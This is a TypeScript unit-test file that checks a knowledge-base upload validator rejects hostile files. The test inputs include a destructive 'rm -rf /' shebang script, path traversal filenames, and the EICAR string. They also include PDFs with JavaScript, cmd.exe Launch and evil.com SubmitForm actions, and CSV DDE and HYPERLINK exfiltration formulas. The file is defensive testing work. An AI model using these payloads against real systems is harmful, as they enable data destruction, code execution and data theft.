import assert from "node:assert/strict";
import { ConvexError } from "convex/values";
import {
  validateKnowledgeBaseUpload,
  scanUploadForMalware,
  ALLOWED_TYPES,
} from "../../packages/backend/convex/lib/uploadSecurity";

function createBuffer(strOrBytes: string | number[] | Uint8Array): ArrayBuffer {
  if (typeof strOrBytes === "string") {
    return new TextEncoder().encode(strOrBytes).buffer;
  }
  const u8 =
    strOrBytes instanceof Uint8Array
      ? strOrBytes
      : new Uint8Array(strOrBytes);
  return u8.buffer.slice(u8.byteOffset, u8.byteOffset + u8.byteLength);
}

function assertThrowsBadRequest(fn: () => unknown, expectedSubstring?: string): void {
  try {
    fn();
    assert.fail("Expected function to throw ConvexError, but it succeeded.");
  } catch (err) {
    if (err instanceof ConvexError) {
      assert.equal((err.data as { code: string }).code, "BAD_REQUEST");
      if (expectedSubstring) {
        assert.ok(
          (err.data as { message: string }).message.includes(expectedSubstring),
          `Expected error message "${(err.data as { message: string }).message}" to include "${expectedSubstring}"`
        );
      }
    } else {
      throw err;
    }
  }
}

async function assertAsyncThrowsBadRequest(
  fn: () => Promise<unknown>,
  expectedSubstring?: string
): Promise<void> {
  try {
    await fn();
    assert.fail("Expected async function to throw ConvexError, but it succeeded.");
  } catch (err) {
    if (err instanceof ConvexError) {
      assert.equal((err.data as { code: string }).code, "BAD_REQUEST");
      if (expectedSubstring) {
        assert.ok(
          (err.data as { message: string }).message.includes(expectedSubstring),
          `Expected error message "${(err.data as { message: string }).message}" to include "${expectedSubstring}"`
        );
      }
    } else {
      throw err;
    }
  }
}

export async function runUploadAndIngestionSecurityTests(): Promise<void> {
  console.log("Running RAG Upload & Ingestion Pipeline Security Unit Tests...");

  // -------------------------------------------------------------
  // 1. MIME Spoofing & Signature Mismatches
  // -------------------------------------------------------------
  console.log("  Testing MIME Spoofing & Signature Verification...");

  // Text content claiming to be a PDF
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("fake.pdf", createBuffer("This is just plain text, not a PDF")),
    "PDF signature is invalid"
  );

  // Random bytes claiming to be PNG
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("image.png", createBuffer([0x00, 0x01, 0x02, 0x03, 0x04])),
    "PNG signature is invalid"
  );

  // Random bytes claiming to be JPEG
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("photo.jpg", createBuffer([0x12, 0x34, 0x56, 0x78])),
    "JPEG signature is invalid"
  );

  // Random bytes claiming to be WebP
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("graphic.webp", createBuffer([0x52, 0x49, 0x46, 0x46, 0, 0, 0, 0, 0x41, 0x42, 0x43, 0x44])),
    "WebP signature is invalid"
  );

  // -------------------------------------------------------------
  // 2. Executables Disguised as Documents (Magic Bytes Check)
  // -------------------------------------------------------------
  console.log("  Testing Disguised Executable Binary Signatures...");

  // DOS/Windows PE header (MZ) disguised as PDF
  const peAsPdf = new Uint8Array(64);
  peAsPdf[0] = 0x4d; // 'M'
  peAsPdf[1] = 0x5a; // 'Z'
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("invoice.pdf", peAsPdf.buffer),
    "Executable binary signatures (DOS/PE) are not permitted"
  );

  // Windows PE header disguised as TXT
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("notes.txt", peAsPdf.buffer),
    "Executable binary signatures (DOS/PE) are not permitted"
  );

  // Linux ELF binary header disguised as CSV
  const elfAsCsv = new Uint8Array(64);
  elfAsCsv.set([0x7f, 0x45, 0x4c, 0x46]); // \x7fELF
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("data.csv", elfAsCsv.buffer),
    "Executable binary signatures (ELF) are not permitted"
  );

  // Mach-O / Java Class bytecode header (0xCAFEBABE) disguised as Markdown
  const machOAsMd = new Uint8Array(64);
  machOAsMd.set([0xca, 0xfe, 0xba, 0xbe]);
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("documentation.md", machOAsMd.buffer),
    "Executable binary signatures (Mach-O/Java Class) are not permitted"
  );

  // WebAssembly bytecode header (\0asm) disguised as JSON
  const wasmAsJson = new Uint8Array(64);
  wasmAsJson.set([0x00, 0x61, 0x73, 0x6d]);
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("config.json", wasmAsJson.buffer),
    "Executable binary signatures (WebAssembly) are not permitted"
  );

  // Unix shell script shebang (#!) disguised as TXT
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("run.txt", createBuffer("#!/bin/bash\nrm -rf /")),
    "Executable script headers (shebang) are not permitted"
  );

  // -------------------------------------------------------------
  // 3. Double & Intermediary Extension Spoofing
  // -------------------------------------------------------------
  console.log("  Testing Double & Intermediary Extension Attacks...");

  const dangerousFilenames = [
    "invoice.exe.pdf",
    "shell.php.txt",
    "script.sh.csv",
    "exploit.bat.md",
    "library.dll.json",
    "trojan.ps1.tsv",
    "backdoor.py.pdf",
    "agent.jar.txt",
    "installer.msi.markdown",
    "payload.vbs.pdf",
  ];

  for (const filename of dangerousFilenames) {
    assertThrowsBadRequest(
      () => validateKnowledgeBaseUpload(filename, createBuffer("harmless text content")),
      "Double extensions or executable intermediary extensions are not permitted"
    );
  }

  // Multi-dot filenames with non-dangerous intermediary segments should be permitted
  const benignMultiDotBuffer = createBuffer("# User Guide\n\nVersion 2.0 release documentation");
  const benignUpload = validateKnowledgeBaseUpload("user.guide.v2.md", benignMultiDotBuffer);
  assert.equal(benignUpload.filename, "user.guide.v2.md");
  assert.equal(benignUpload.mimeType, "text/markdown");

  // -------------------------------------------------------------
  // 4. Path Traversal & Filename Sanitization
  // -------------------------------------------------------------
  console.log("  Testing Path Traversal & Malicious Filenames...");

  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("../../etc/passwd.txt", createBuffer("root:x:0:0")),
    "Filename contains path traversal sequences"
  );

  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("..\\windows\\system.ini.txt", createBuffer("[drivers]")),
    "Filename contains path traversal sequences"
  );

  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("subfolder/doc.txt", createBuffer("text")),
    "Filename contains path traversal sequences"
  );

  // Null bytes & control characters in filename
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("payload\u0000.txt", createBuffer("text")),
    "Filename is invalid"
  );

  // Right-to-Left Override spoofing character (\u202E)
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("document\u202Efdp.txt", createBuffer("text")),
    "Filename contains invalid directional override characters"
  );

  // Overly long filename (> 120 chars)
  const longFilename = "a".repeat(125) + ".txt";
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload(longFilename, createBuffer("text")),
    "Filename is invalid"
  );

  // -------------------------------------------------------------
  // 5. EICAR Antivirus Test Signature
  // -------------------------------------------------------------
  console.log("  Testing EICAR Antivirus Test Signature Detection...");

  const eicarString = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("test-virus.txt", createBuffer(eicarString)),
    "File contains a known malware test signature (EICAR)"
  );

  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("eicar.md", createBuffer(`# Test Document\n\n${eicarString}`)),
    "File contains a known malware test signature (EICAR)"
  );

  // -------------------------------------------------------------
  // 6. Archive & Decompression Bomb Signatures Disguised as Documents
  // -------------------------------------------------------------
  console.log("  Testing Disguised Archive & Decompression Bomb Detection...");

  // ZIP header (PK\x03\x04) renamed as .txt
  const zipAsTxt = new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00]);
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("archive.txt", zipAsTxt.buffer),
    "Archive files and compressed containers (ZIP) are not permitted"
  );

  // GZIP header (\x1f\x8b) renamed as .csv
  const gzipAsCsv = new Uint8Array([0x1f, 0x8b, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00]);
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("bomb.csv", gzipAsCsv.buffer),
    "Compressed archives (GZIP) are not permitted"
  );

  // 7-Zip header (7z\xbc\xaf\x27\x1c) renamed as .json
  const sevenZipAsJson = new Uint8Array([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0x00]);
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("payload.json", sevenZipAsJson.buffer),
    "Archive files (7-Zip) are not permitted"
  );

  // RAR header (Rar!\x1a\x07) renamed as .md
  const rarAsMd = new Uint8Array([0x52, 0x61, 0x72, 0x21, 0x1a, 0x07, 0x00]);
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("archive.md", rarAsMd.buffer),
    "Archive files (RAR) are not permitted"
  );

  // -------------------------------------------------------------
  // 7. Malformed Documents & Threat Payloads (PDF & Spreadsheet)
  // -------------------------------------------------------------
  console.log("  Testing Malformed Documents & PDF / CSV Payloads...");

  // Truncated PDF (missing %%EOF trailer)
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("corrupt.pdf", createBuffer("%PDF-1.4\n1 0 obj\n<< >>\nendobj")),
    "PDF structure is incomplete"
  );

  // PDF with embedded JavaScript
  const pdfWithJs = "%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Names << /JavaScript 3 0 R >> >>\nendobj\n%%EOF";
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("exploit.pdf", createBuffer(pdfWithJs)),
    "PDF contains active or embedded content that is not allowed"
  );

  // PDF with Launch action
  const pdfWithLaunch = "%PDF-1.4\n1 0 obj\n<< /Type /Action /S /Launch /F (cmd.exe) >>\nendobj\n%%EOF";
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("launch.pdf", createBuffer(pdfWithLaunch)),
    "PDF contains active or embedded content that is not allowed"
  );

  // PDF with SubmitForm action
  const pdfWithSubmit = "%PDF-1.4\n1 0 obj\n<< /Type /Action /S /SubmitForm /F << /FS /URL /F (http://evil.com) >> >>\nendobj\n%%EOF";
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("exfiltrate.pdf", createBuffer(pdfWithSubmit)),
    "PDF contains active or embedded content that is not allowed"
  );

  // PDF with recursive FlateDecode filters (decompression bomb)
  const pdfWithFlateBomb = "%PDF-1.4\n1 0 obj\n<< /Length 100 /Filter [/FlateDecode /FlateDecode] >>\nstream\n...\nendstream\nendobj\n%%EOF";
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("flate-bomb.pdf", createBuffer(pdfWithFlateBomb)),
    "PDF contains recursive decompression filters (decompression bomb risk)"
  );

  // CSV Formula Injection (DDE)
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("formula_injection.csv", createBuffer("Name,Value\nTest,=cmd|' /C calc'!A0")),
    "Spreadsheet contains potentially malicious formulas or command execution payloads"
  );

  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("hyperlink_exfil.csv", createBuffer("Product,Link\nItem,=HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click Me\")")),
    "Spreadsheet contains potentially malicious formulas or command execution payloads"
  );

  // Malformed JSON
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("broken.json", createBuffer("{ invalid json: missing_quotes }")),
    "JSON uploads must contain valid JSON"
  );

  // Text file with illegal null bytes
  assertThrowsBadRequest(
    () => validateKnowledgeBaseUpload("null.txt", createBuffer("Hello\u0000World")),
    "Text uploads contain unsupported control characters"
  );

  // -------------------------------------------------------------
  // 8. Valid Document Ingestion & Supported Formats
  // -------------------------------------------------------------
  console.log("  Testing Valid Document Ingestion for Supported Formats...");

  // Valid Markdown
  const mdResult = validateKnowledgeBaseUpload(
    "support-faq.md",
    createBuffer("# Support FAQ\n\n## Question 1\nHow do I reset my password?\n")
  );
  assert.equal(mdResult.filename, "support-faq.md");
  assert.equal(mdResult.mimeType, "text/markdown");

  // Valid CSV
  const csvResult = validateKnowledgeBaseUpload(
    "pricing.csv",
    createBuffer("Plan,Monthly Price ($),Seats\nStarter,29,3\nPro,99,10\nEnterprise,299,Unlimited\n")
  );
  assert.equal(csvResult.filename, "pricing.csv");
  assert.equal(csvResult.mimeType, "text/csv");

  // Valid TSV
  const tsvResult = validateKnowledgeBaseUpload(
    "inventory.tsv",
    createBuffer("SKU\tItem\tQuantity\nA-100\tWidget\t45\nB-200\tGadget\t12\n")
  );
  assert.equal(tsvResult.filename, "inventory.tsv");
  assert.equal(tsvResult.mimeType, "text/tab-separated-values");

  // Valid JSON
  const jsonResult = validateKnowledgeBaseUpload(
    "company_policies.json",
    createBuffer(JSON.stringify([{ policy: "Refund", windowDays: 30 }, { policy: "SLA", hours: 24 }]))
  );
  assert.equal(jsonResult.filename, "company_policies.json");
  assert.equal(jsonResult.mimeType, "application/json");

  // Valid PDF
  const validPdfContent = "%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R >>\nendobj\n%%EOF";
  const pdfResult = validateKnowledgeBaseUpload("manual.pdf", createBuffer(validPdfContent));
  assert.equal(pdfResult.filename, "manual.pdf");
  assert.equal(pdfResult.mimeType, "application/pdf");

  // Valid PNG (signature 89 50 4E 47 0D 0A 1A 0A)
  const validPng = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00, 0x00]);
  const pngResult = validateKnowledgeBaseUpload("diagram.png", validPng.buffer);
  assert.equal(pngResult.filename, "diagram.png");
  assert.equal(pngResult.mimeType, "image/png");

  // Valid JPEG (signature FF D8 FF)
  const validJpg = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10]);
  const jpgResult = validateKnowledgeBaseUpload("screenshot.jpeg", validJpg.buffer);
  assert.equal(jpgResult.filename, "screenshot.jpeg");
  assert.equal(jpgResult.mimeType, "image/jpeg");

  // Valid WebP (RIFF....WEBP)
  const validWebp = new Uint8Array([
    0x52, 0x49, 0x46, 0x46, // RIFF
    0x20, 0x00, 0x00, 0x00, // length
    0x57, 0x45, 0x42, 0x50, // WEBP
    0x56, 0x50, 0x38, 0x20, // VP8
  ]);
  const webpResult = validateKnowledgeBaseUpload("badge.webp", validWebp.buffer);
  assert.equal(webpResult.filename, "badge.webp");
  assert.equal(webpResult.mimeType, "image/webp");

  // -------------------------------------------------------------
  // 9. Antivirus Scanning Fail-Closed & Test Simulation
  // -------------------------------------------------------------
  console.log("  Testing Antivirus Scanner Fail-Closed & Mock Behaviors...");

  // Fail-closed when scanner is unconfigured (clean env)
  const prevScannerUrl = process.env.MALWARE_SCANNER_URL;
  const prevScannerToken = process.env.MALWARE_SCANNER_TOKEN;
  const prevMockMode = process.env.TEST_MALWARE_SCANNER_MOCK;

  try {
    delete process.env.MALWARE_SCANNER_URL;
    delete process.env.MALWARE_SCANNER_TOKEN;
    delete process.env.TEST_MALWARE_SCANNER_MOCK;

    await assertAsyncThrowsBadRequest(
      () => scanUploadForMalware(createBuffer("test text"), "safe.txt", "text/plain"),
      "File scanning is not configured. Uploads are temporarily unavailable."
    );

    // Fail-closed on insecure scanner protocol (http instead of https)
    process.env.MALWARE_SCANNER_URL = "http://insecure-scanner.internal/scan";
    process.env.MALWARE_SCANNER_TOKEN = "test-token";
    await assertAsyncThrowsBadRequest(
      () => scanUploadForMalware(createBuffer("test text"), "safe.txt", "text/plain"),
      "File scanning is not configured. Uploads are temporarily unavailable."
    );

    // Test mock mode: simulated infected file rejection
    process.env.TEST_MALWARE_SCANNER_MOCK = "infected";
    await assertAsyncThrowsBadRequest(
      () => scanUploadForMalware(createBuffer("test text"), "safe.txt", "text/plain"),
      "The file was rejected by malware scanning."
    );

    // Test mock mode: simulated scanner error / outage
    process.env.TEST_MALWARE_SCANNER_MOCK = "error";
    await assertAsyncThrowsBadRequest(
      () => scanUploadForMalware(createBuffer("test text"), "safe.txt", "text/plain"),
      "File scanning failed. Uploads are temporarily unavailable."
    );

    // Test mock mode: clean file passes
    process.env.TEST_MALWARE_SCANNER_MOCK = "clean";
    await scanUploadForMalware(createBuffer("clean document"), "safe.txt", "text/plain");

    // Pre-scan EICAR rejection happens even before scanner mock
    await assertAsyncThrowsBadRequest(
      () => scanUploadForMalware(createBuffer(eicarString), "eicar.txt", "text/plain"),
      "File contains a known malware test signature (EICAR)"
    );
  } finally {
    if (prevScannerUrl) process.env.MALWARE_SCANNER_URL = prevScannerUrl;
    else delete process.env.MALWARE_SCANNER_URL;
    if (prevScannerToken) process.env.MALWARE_SCANNER_TOKEN = prevScannerToken;
    else delete process.env.MALWARE_SCANNER_TOKEN;
    if (prevMockMode) process.env.TEST_MALWARE_SCANNER_MOCK = prevMockMode;
    else delete process.env.TEST_MALWARE_SCANNER_MOCK;
  }

  console.log("✅ All RAG Upload & Ingestion Pipeline Security Unit Tests Passed Successfully!");
}

runUploadAndIngestionSecurityTests().catch((err) => {
  console.error("Test failed:", err);
  process.exit(1);
});

